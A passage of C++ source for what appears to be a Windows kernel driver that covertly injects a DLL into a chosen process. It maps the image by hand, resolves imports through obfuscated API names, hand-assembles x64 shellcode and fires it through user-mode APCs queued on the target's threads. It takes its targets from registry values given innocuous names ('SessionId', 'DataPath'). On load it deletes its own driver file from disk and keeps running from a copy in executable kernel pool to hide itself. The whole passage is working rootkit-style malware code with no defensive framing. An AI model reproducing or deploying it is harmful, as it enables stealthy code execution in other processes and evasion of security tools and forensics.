        bool exec  = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
        bool write = (ch & IMAGE_SCN_MEM_WRITE) != 0;
        if (exec && write)      prot = PAGE_EXECUTE_READWRITE;
        else if (exec)          prot = PAGE_EXECUTE_READ;
        else if (!write)        prot = PAGE_READONLY;
        else                    continue;

        PVOID  secBase = reinterpret_cast<PVOID>(reinterpret_cast<PUCHAR>(remoteBase) + sec[i].VirtualAddress);
        SIZE_T secSize = sec[i].SizeOfRawData ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
        if (secSize == 0) continue;
        ULONG  old;
        protStatus = ZwProtectVirtualMemory(ZwCurrentProcess(), &secBase, &secSize, prot, &old);
    }

    PVOID dllMain = reinterpret_cast<PVOID>(
        reinterpret_cast<PUCHAR>(remoteBase) + nt->OptionalHeader.AddressOfEntryPoint);

    if (diag) {
        diag->DllBase = reinterpret_cast<ULONG64>(remoteBase);
        diag->EntryPointRva = nt->OptionalHeader.AddressOfEntryPoint;
        diag->ProtectStatus = static_cast<LONG>(protStatus);
        diag->ImageSize = static_cast<ULONG>(imageSize);
    }

    PVOID loadLibA = nullptr;
    PVOID getProcAddr = nullptr;
    PVOID rtlAddFuncTable = nullptr;
    {
        DECODE(k32Name, ENC_K32);
        DECODE(ntdllName, ENC_NTDLL);
        DECODE(loadLibName, ENC_LOADLIB);
        DECODE(getProcName, ENC_GETPROC);
        DECODE(rtlAddName, ENC_RTLADD);
        PVOID k32 = FindModInPeb(peb ? peb->Ldr : nullptr, k32Name);
        if (k32) {
            loadLibA = GetExportByName(k32, loadLibName, peb ? peb->Ldr : nullptr);
            getProcAddr = GetExportByName(k32, getProcName, peb ? peb->Ldr : nullptr);
        }
        PVOID ntdll = FindModInPeb(peb ? peb->Ldr : nullptr, ntdllName);
        if (ntdll)
            rtlAddFuncTable = GetExportByName(ntdll, rtlAddName, peb ? peb->Ldr : nullptr);
        if (!rtlAddFuncTable && k32)
            rtlAddFuncTable = GetExportByName(k32, rtlAddName, peb ? peb->Ldr : nullptr);
    }

    if (diag) {
        diag->MissingModCount = missingCount;
        diag->UnresolvedCount = unresolvedCount;
        diag->LoadLibAddr = reinterpret_cast<ULONG64>(loadLibA);
        diag->GetProcAddr = reinterpret_cast<ULONG64>(getProcAddr);
        for (ULONG m = 0; m < missingCount && m < 8; m++) {
            for (int k = 0; k < 63 && missingMods[m][k]; k++)
                diag->MissingMod[m][k] = missingMods[m][k];
            diag->MissingMod[m][63] = 0;
        }
    }

    ULONG totalStringBytes = missingCount * 64;
    for (ULONG i = 0; i < unresolvedCount && unresolvedBuf; i++) {
        if (!unresolvedBuf[i].byOrdinal) {
            ULONG len = 0;
            while (unresolvedBuf[i].funcName[len]) len++;
            totalStringBytes += len + 1;
        }
    }
    if (totalStringBytes < 4096) totalStringBytes = 4096;

    PVOID dataBase = nullptr;
    SIZE_T dataSize = totalStringBytes;
    status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &dataBase, 0, &dataSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        if (unresolvedBuf) ExFreePoolWithTag(unresolvedBuf, POOL_TAG);
        KeUnstackDetachProcess(&apcState);
        return status;
    }

    if (diag) diag->DataPageAddr = reinterpret_cast<ULONG64>(dataBase);

    ULONG dataOff = 4;
    PVOID modNameAddrs[32] = {};
    for (ULONG m = 0; m < missingCount; m++) {
        ULONG len = 0; while (missingMods[m][len]) len++; len++;
        modNameAddrs[m] = reinterpret_cast<PUCHAR>(dataBase) + dataOff;
        SafeWrite(modNameAddrs[m], missingMods[m], len);
        dataOff += len;
    }
    dataOff = (dataOff + 7) & ~7;

    PVOID* funcNameAddrs = nullptr;
    if (unresolvedCount > 0) {
        funcNameAddrs = static_cast<PVOID*>(
            ExAllocatePool2(POOL_FLAG_NON_PAGED, unresolvedCount * sizeof(PVOID), POOL_TAG));
        if (funcNameAddrs) RtlZeroMemory(funcNameAddrs, unresolvedCount * sizeof(PVOID));
    }
    for (ULONG i = 0; i < unresolvedCount && unresolvedBuf && funcNameAddrs; i++) {
        if (!unresolvedBuf[i].byOrdinal) {
            const char* fn = unresolvedBuf[i].funcName;
            ULONG len = 0; while (fn[len]) len++; len++;
            funcNameAddrs[i] = reinterpret_cast<PUCHAR>(dataBase) + dataOff;
            SafeWrite(funcNameAddrs[i], fn, len);
            dataOff += len;
        }
    }

    ULONG maxSc = 608 + missingCount * 35 + unresolvedCount * 38 + 256;
    auto* sc = static_cast<PUCHAR>(ExAllocatePool2(POOL_FLAG_NON_PAGED, maxSc, POOL_TAG));
    if (!sc) {
        if (funcNameAddrs) ExFreePoolWithTag(funcNameAddrs, POOL_TAG);
        if (unresolvedBuf) ExFreePoolWithTag(unresolvedBuf, POOL_TAG);
        KeUnstackDetachProcess(&apcState);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(sc, maxSc);
    ULONG off = 0;
    ULONG guardJmpOff = 0;

    sc[off++] = 0x41; sc[off++] = 0x54;  // push r12
    sc[off++] = 0x41; sc[off++] = 0x55;  // push r13
    sc[off++] = 0x41; sc[off++] = 0x56;  // push r14
    sc[off++] = 0x48; sc[off++] = 0x83; sc[off++] = 0xEC; sc[off++] = 0x30;

    {
        PVOID gAddr = dataBase;
        sc[off++] = 0x48; sc[off++] = 0xB9;
        memcpy(sc + off, &gAddr, 8); off += 8;
        sc[off++] = 0xB8; sc[off++] = 0x01; sc[off++] = 0x00; sc[off++] = 0x00; sc[off++] = 0x00;
        sc[off++] = 0x87; sc[off++] = 0x01;
        sc[off++] = 0x85; sc[off++] = 0xC0;
        guardJmpOff = off;
        sc[off++] = 0x0F; sc[off++] = 0x85;
        sc[off++] = 0x00; sc[off++] = 0x00; sc[off++] = 0x00; sc[off++] = 0x00;
    }

    if (loadLibA && getProcAddr && unresolvedBuf && funcNameAddrs && missingCount > 0) {
        for (ULONG m = 0; m < missingCount; m++) {
            ULONG funcCount = 0;
            for (ULONG i = 0; i < unresolvedCount; i++)
                if (unresolvedBuf[i].moduleIndex == m) funcCount++;

            sc[off++] = 0x48; sc[off++] = 0xB9;
            memcpy(sc + off, &modNameAddrs[m], 8); off += 8;
            sc[off++] = 0x48; sc[off++] = 0xB8;
            memcpy(sc + off, &loadLibA, 8); off += 8;
            sc[off++] = 0xFF; sc[off++] = 0xD0;
            sc[off++] = 0x48; sc[off++] = 0x85; sc[off++] = 0xC0;
            sc[off++] = 0x75; sc[off++] = 0x05;
            ULONG skipDist = 3 + funcCount * 38;
            sc[off++] = 0xE9;
            memcpy(sc + off, &skipDist, 4); off += 4;
            sc[off++] = 0x49; sc[off++] = 0x89; sc[off++] = 0xC4;

            for (ULONG i = 0; i < unresolvedCount; i++) {
                if (unresolvedBuf[i].moduleIndex != m) continue;
                sc[off++] = 0x4C; sc[off++] = 0x89; sc[off++] = 0xE1;
                if (unresolvedBuf[i].byOrdinal) {
                    ULONG64 ord64 = unresolvedBuf[i].ordinal;
                    sc[off++] = 0x48; sc[off++] = 0xBA;
                    memcpy(sc + off, &ord64, 8); off += 8;
                } else {
                    sc[off++] = 0x48; sc[off++] = 0xBA;
                    memcpy(sc + off, &funcNameAddrs[i], 8); off += 8;
                }
                sc[off++] = 0x48; sc[off++] = 0xB8;
                memcpy(sc + off, &getProcAddr, 8); off += 8;
                sc[off++] = 0xFF; sc[off++] = 0xD0;
                sc[off++] = 0x48; sc[off++] = 0xB9;
                memcpy(sc + off, &unresolvedBuf[i].iatSlotAddr, 8); off += 8;
                sc[off++] = 0x48; sc[off++] = 0x89; sc[off++] = 0x01;
            }
        }
    }

    PVOID markerAddr = reinterpret_cast<PVOID>(reinterpret_cast<PUCHAR>(dataBase) + 4);
    #define WRITE_MARKER(val) do { \
        sc[off++] = 0x48; sc[off++] = 0xB9; \
        memcpy(sc + off, &markerAddr, 8); off += 8; \
        sc[off++] = 0xC6; sc[off++] = 0x01; sc[off++] = (UCHAR)(val); \
    } while(0)

    WRITE_MARKER(0x11);

    if (rtlAddFuncTable && exceptionEntries > 0 && exceptionDirAddr) {
        sc[off++] = 0x48; sc[off++] = 0xB9;
        memcpy(sc + off, &exceptionDirAddr, 8); off += 8;
        ULONG64 entryCount64 = exceptionEntries;
        sc[off++] = 0x48; sc[off++] = 0xBA;
        memcpy(sc + off, &entryCount64, 8); off += 8;
        sc[off++] = 0x49; sc[off++] = 0xB8;
        memcpy(sc + off, &remoteBase, 8); off += 8;
        sc[off++] = 0x48; sc[off++] = 0xB8;
        memcpy(sc + off, &rtlAddFuncTable, 8); off += 8;
        sc[off++] = 0xFF; sc[off++] = 0xD0;
    }

    WRITE_MARKER(0x22);

    sc[off++] = 0x48; sc[off++] = 0xB9;
    memcpy(sc + off, &remoteBase, 8); off += 8;
    sc[off++] = 0xBA; sc[off++] = 0x01; sc[off++] = 0x00; sc[off++] = 0x00; sc[off++] = 0x00;
    sc[off++] = 0x4D; sc[off++] = 0x31; sc[off++] = 0xC0;
    sc[off++] = 0x48; sc[off++] = 0xB8;
    memcpy(sc + off, &dllMain, 8); off += 8;
    sc[off++] = 0xFF; sc[off++] = 0xD0;

    WRITE_MARKER(0x33);

    #undef WRITE_MARKER

    if (guardJmpOff) {
        ULONG rel = off - (guardJmpOff + 6);
        memcpy(sc + guardJmpOff + 2, &rel, 4);
    }
    sc[off++] = 0x48; sc[off++] = 0x83; sc[off++] = 0xC4; sc[off++] = 0x30;
    sc[off++] = 0x41; sc[off++] = 0x5E;
    sc[off++] = 0x41; sc[off++] = 0x5D;
    sc[off++] = 0x41; sc[off++] = 0x5C;
    sc[off++] = 0x31; sc[off++] = 0xC0;
    sc[off++] = 0xC3;

    if (funcNameAddrs) ExFreePoolWithTag(funcNameAddrs, POOL_TAG);
    if (unresolvedBuf) ExFreePoolWithTag(unresolvedBuf, POOL_TAG);

    if (diag) {
        diag->ExceptionEntries = exceptionEntries;
        diag->RtlAddFuncTableAddr = reinterpret_cast<ULONG64>(rtlAddFuncTable);
        diag->ShellcodeSize = off;
    }

    PVOID scBase = nullptr;
    SIZE_T scPageSize = PAGE_SIZE;
    status = ZwAllocateVirtualMemory(ZwCurrentProcess(), &scBase, 0, &scPageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(sc, POOL_TAG);
        KeUnstackDetachProcess(&apcState);
        return status;
    }
    status = SafeWrite(scBase, sc, off);
    ExFreePoolWithTag(sc, POOL_TAG);

    if (NT_SUCCESS(status)) {
        PVOID  scProtectBase = scBase;
        SIZE_T scProtectSize = scPageSize;
        ULONG  scOldProt;
        ZwProtectVirtualMemory(ZwCurrentProcess(), &scProtectBase, &scProtectSize,
                                PAGE_EXECUTE_READ, &scOldProt);
    }

    KeUnstackDetachProcess(&apcState);

    if (NT_SUCCESS(status)) {
        if (diag) diag->ShellcodeAddr = reinterpret_cast<ULONG64>(scBase);

        HANDLE hProcess = nullptr;
        status = ObOpenObjectByPointer(targetProcess, OBJ_KERNEL_HANDLE, nullptr,
            PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
        if (NT_SUCCESS(status)) {
            const int APC_THREAD_WINDOW = 16;
            HANDLE ringBuf[APC_THREAD_WINDOW] = {};
            int ringIdx = 0, ringFull = 0;
            HANDLE hThread = nullptr;
            HANDLE hPrev = nullptr;
            int totalThreads = 0;
            while (NT_SUCCESS(ZwGetNextThread(hProcess, hPrev, THREAD_ALL_ACCESS,
                                              OBJ_KERNEL_HANDLE, 0, &hThread))) {
                if (ringFull) ZwClose(ringBuf[ringIdx]);
                ringBuf[ringIdx] = hThread;
                ringIdx = (ringIdx + 1) % APC_THREAD_WINDOW;
                if (ringIdx == 0) ringFull = 1;
                totalThreads++;
                hPrev = hThread;
                hThread = nullptr;
            }
            if (diag) diag->TotalThreads = totalThreads;

            int apcCount = ringFull ? APC_THREAD_WINDOW : ringIdx;
            int apcStart = ringFull ? ringIdx : 0;
            int apcQueued = 0;
            for (int k = 0; k < apcCount; k++) {
                HANDLE h = ringBuf[(apcStart + k) % APC_THREAD_WINDOW];
                PETHREAD th = nullptr;
                if (!NT_SUCCESS(ObReferenceObjectByHandle(h, 0, *PsThreadType,
                        KernelMode, reinterpret_cast<PVOID*>(&th), nullptr))) {
                    ZwClose(h);
                    continue;
                }
                PKAPC apc = static_cast<PKAPC>(
                    ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC), POOL_TAG));
                if (apc) {
                    KeInitializeApc(apc, reinterpret_cast<PRKTHREAD>(th),
                        OriginalApcEnvironment,
                        g_ExFreePool,
                        g_ExFreePool,
                        reinterpret_cast<PVOID>(scBase),
                        UserMode, nullptr);
                    if (KeInsertQueueApc(apc, nullptr, nullptr, IO_NO_INCREMENT)) {
                        KeAlertThread(reinterpret_cast<PKTHREAD>(th), UserMode);
                        apcQueued++;
                    } else {
                        ExFreePoolWithTag(apc, POOL_TAG);
                    }
                }
                ObDereferenceObject(th);
                ZwClose(h);
            }
            if (diag) diag->ApcCount = apcQueued;
            status = apcQueued > 0 ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
            ZwClose(hProcess);
        }
    }

    return status;
}

static UCHAR ReadMarkerSafe(PEPROCESS proc, PVOID addr) {
    if (PsGetProcessExitStatus(proc) != STATUS_PENDING) return 0xFF;
    KAPC_STATE apcState;
    KeStackAttachProcess(proc, &apcState);
    UCHAR marker = 0xFF;
    if (MmIsAddressValid(addr))
        marker = *static_cast<volatile UCHAR*>(addr);
    KeUnstackDetachProcess(&apcState);
    return marker;
}

static void PostInjectPoll(PEPROCESS proc, InjectionDiag* diag) {
    PVOID markerAddr = reinterpret_cast<PVOID>(diag->DataPageAddr + 4);
    LARGE_INTEGER delay;
    delay.QuadPart = -1000000LL; // 100ms

    for (int i = 0; i < 80; i++) {
        KeDelayExecutionThread(KernelMode, FALSE, &delay);
        if (PsGetProcessExitStatus(proc) != STATUS_PENDING) {
            diag->ProcessAlive = 0;
            diag->ProgressMarker = ReadMarkerSafe(proc, markerAddr);
            return;
        }
        UCHAR marker = ReadMarkerSafe(proc, markerAddr);
        diag->ProgressMarker = marker;
        if (marker == 0x33) break;
    }
    diag->ProcessAlive = PsGetProcessExitStatus(proc) == STATUS_PENDING ? 1 : 0;
}

static PVOID PersistToPool() {
    PUCHAR base = reinterpret_cast<PUCHAR>(&__ImageBase);
    SIZE_T imageSize = 0;

    auto* dos = &__ImageBase;
    if (dos->e_magic == IMAGE_DOS_SIGNATURE &&
        dos->e_lfanew > 0 && dos->e_lfanew < 0x1000) {
        auto* nt = reinterpret_cast<PIMAGE_NT_HEADERS>(base + dos->e_lfanew);
        if (nt->Signature == IMAGE_NT_SIGNATURE)
            imageSize = nt->OptionalHeader.SizeOfImage;
    }

    if (imageSize < 0x1000 || imageSize > 0xA00000) {
        ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(base);
        ULONG_PTR offsets[] = {
            reinterpret_cast<ULONG_PTR>(&g_PoolCopy) - baseAddr,
            reinterpret_cast<ULONG_PTR>(&g_StopWorker) - baseAddr,
        };
        ULONG_PTR highest = 0;
        for (int i = 0; i < 2; i++)
            if (offsets[i] > highest) highest = offsets[i];
        imageSize = ((highest + 0x2000) + 0xFFF) & ~0xFFFULL;
    }

    if (imageSize < 0x1000) return nullptr;

    #pragma warning(suppress: 4996)
    PVOID pool = ExAllocatePoolWithTag(NonPagedPoolExecute, imageSize, POOL_TAG);
    if (!pool) return nullptr;

    RtlCopyMemory(pool, base, imageSize);
    return pool;
}

static VOID WorkerThread(PVOID) {
    UNICODE_STRING keyPath;
    RtlInitUnicodeString(&keyPath, REG_KEY_PATH);
    OBJECT_ATTRIBUTES keyOa;
    InitializeObjectAttributes(&keyOa, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);

    LARGE_INTEGER pollDelay;
    pollDelay.QuadPart = -2000000LL; // 200ms

    while (!InterlockedCompareExchange(&g_StopWorker, 0, 0)) {
        KeDelayExecutionThread(KernelMode, FALSE, &pollDelay);

        HANDLE hKey;
        NTSTATUS status = ZwOpenKey(&hKey, KEY_READ | KEY_WRITE, &keyOa);
        if (!NT_SUCCESS(status)) continue;

        UNICODE_STRING valName;
        ULONG resultLen;

        UCHAR pidBuf[sizeof(KEY_VALUE_PARTIAL_INFORMATION) + sizeof(ULONG)];
        RtlInitUnicodeString(&valName, L"SessionId");
        status = ZwQueryValueKey(hKey, &valName, KeyValuePartialInformation, pidBuf, sizeof(pidBuf), &resultLen);
        if (!NT_SUCCESS(status)) {
            ZwClose(hKey);
            continue;
        }
        ULONG targetPid = *reinterpret_cast<PULONG>(reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(pidBuf)->Data);

        UCHAR pathBuf[sizeof(KEY_VALUE_PARTIAL_INFORMATION) + 600];
        RtlInitUnicodeString(&valName, L"DataPath");
        status = ZwQueryValueKey(hKey, &valName, KeyValuePartialInformation, pathBuf, sizeof(pathBuf), &resultLen);
        if (!NT_SUCCESS(status)) {
            ZwClose(hKey);
            continue;
        }
        WCHAR* dllPath = reinterpret_cast<WCHAR*>(reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(pathBuf)->Data);

        RtlInitUnicodeString(&valName, L"SessionId");
        ZwDeleteValueKey(hKey, &valName);

        UNICODE_STRING filePath;
        RtlInitUnicodeString(&filePath, dllPath);
        OBJECT_ATTRIBUTES fileOa;
        InitializeObjectAttributes(&fileOa, &filePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);
        IO_STATUS_BLOCK ios;
        HANDLE fileHandle;
        status = ZwCreateFile(&fileHandle, GENERIC_READ, &fileOa, &ios, nullptr,
            FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0);

        InjectionDiag diag = {};

        if (NT_SUCCESS(status)) {
            FILE_STANDARD_INFORMATION fi;
            status = ZwQueryInformationFile(fileHandle, &ios, &fi, sizeof(fi), FileStandardInformation);
            if (NT_SUCCESS(status)) {
                auto fileSize = static_cast<SIZE_T>(fi.EndOfFile.QuadPart);
                auto* data = static_cast<PUCHAR>(ExAllocatePool2(POOL_FLAG_NON_PAGED, fileSize, POOL_TAG));
                if (data) {
                    status = ZwReadFile(fileHandle, nullptr, nullptr, nullptr, &ios,
                        data, static_cast<ULONG>(fileSize), nullptr, nullptr);
                    if (NT_SUCCESS(status)) {
                        PEPROCESS proc;
                        status = PsLookupProcessByProcessId(
                            reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(targetPid)), &proc);
                        if (NT_SUCCESS(status)) {
                            status = InjectDll(proc, data, fileSize, &diag);
                            if (NT_SUCCESS(status)) {
                                diag.Status = static_cast<LONG>(status);
                                PostInjectPoll(proc, &diag);
                            }
                            ObDereferenceObject(proc);
                        }
                    }
                    ExFreePoolWithTag(data, POOL_TAG);
                } else {
                    status = STATUS_INSUFFICIENT_RESOURCES;
                }
            }
            ZwClose(fileHandle);
        }

        diag.Status = static_cast<LONG>(status);

        RtlInitUnicodeString(&valName, L"Status");
        ULONG statusVal = static_cast<ULONG>(status);
        ZwSetValueKey(hKey, &valName, 0, REG_DWORD, &statusVal, sizeof(statusVal));

        RtlInitUnicodeString(&valName, L"DiagData");
        ZwSetValueKey(hKey, &valName, 0, REG_BINARY, &diag, sizeof(diag));

        ZwClose(hKey);
    }
}

static void SelfDeleteOnDisk(PUNICODE_STRING RegistryPath) {
    if (!RegistryPath || !RegistryPath->Buffer) return;

    OBJECT_ATTRIBUTES svcOa;
    InitializeObjectAttributes(&svcOa, RegistryPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);
    HANDLE hSvc = nullptr;
    if (!NT_SUCCESS(ZwOpenKey(&hSvc, KEY_READ, &svcOa))) return;

    UNICODE_STRING valName;
    RtlInitUnicodeString(&valName, L"ImagePath");
    UCHAR buf[sizeof(KEY_VALUE_PARTIAL_INFORMATION) + 600];
    ULONG resLen = 0;
    NTSTATUS st = ZwQueryValueKey(hSvc, &valName, KeyValuePartialInformation, buf, sizeof(buf), &resLen);
    ZwClose(hSvc);
    if (!NT_SUCCESS(st)) return;

    auto* pi = reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(buf);
    WCHAR* imgPath = reinterpret_cast<WCHAR*>(pi->Data);

    WCHAR fullPath[600] = {};
    SIZE_T dstOff = 0;
    const WCHAR* prefix = L"\\??\\";
    if (imgPath[0] == L'\\' && imgPath[1] == L'?' && imgPath[2] == L'?' && imgPath[3] == L'\\') {
        for (int k = 0; imgPath[k] && dstOff < 598; k++) fullPath[dstOff++] = imgPath[k];
    } else if (imgPath[0] == L'\\' && imgPath[1] == L'S' && imgPath[2] == L'y') {
        for (int k = 0; prefix[k]; k++) fullPath[dstOff++] = prefix[k];
        WCHAR sysRoot[] = L"C:\\Windows";
        for (int k = 0; sysRoot[k]; k++) fullPath[dstOff++] = sysRoot[k];
        for (int k = 11; imgPath[k] && dstOff < 598; k++) fullPath[dstOff++] = imgPath[k];
    } else {
        for (int k = 0; prefix[k]; k++) fullPath[dstOff++] = prefix[k];
        for (int k = 0; imgPath[k] && dstOff < 598; k++) fullPath[dstOff++] = imgPath[k];
    }
    fullPath[dstOff] = 0;

    UNICODE_STRING fileName;
    RtlInitUnicodeString(&fileName, fullPath);
    OBJECT_ATTRIBUTES fileOa;
    InitializeObjectAttributes(&fileOa, &fileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, nullptr, nullptr);
    IO_STATUS_BLOCK ios;
    HANDLE hFile = nullptr;
    st = ZwOpenFile(&hFile, DELETE | SYNCHRONIZE, &fileOa, &ios,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    FILE_SYNCHRONOUS_IO_NONALERT);
    if (!NT_SUCCESS(st)) return;

    // POSIX semantics allow delete while file is mapped (driver loaded).
    struct { ULONG Flags; } disp;
    disp.Flags = 0x1 | 0x2; // FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS
    ZwSetInformationFile(hFile, &ios, &disp, sizeof(disp), (FILE_INFORMATION_CLASS)64);
    ZwClose(hFile);
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT, PUNICODE_STRING RegistryPath) {
    SelfDeleteOnDisk(RegistryPath);

    UNICODE_STRING efpName;
    RtlInitUnicodeString(&efpName, L"ExFreePool");
    g_ExFreePool = MmGetSystemRoutineAddress(&efpName);

    g_PoolCopy = PersistToPool();
    if (!g_PoolCopy) return STATUS_INSUFFICIENT_RESOURCES;

    auto poolWorker = reinterpret_cast<PKSTART_ROUTINE>(
        static_cast<PUCHAR>(g_PoolCopy) +
        (reinterpret_cast<ULONG_PTR>(WorkerThread) - reinterpret_cast<ULONG_PTR>(&__ImageBase)));

    HANDLE hThread = nullptr;
    NTSTATUS status = PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, nullptr, nullptr, nullptr,
                                           poolWorker, nullptr);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(g_PoolCopy, POOL_TAG);
        g_PoolCopy = nullptr;
        return status;
    }

    ZwClose(hThread);
    return STATUS_SUCCESS;
}
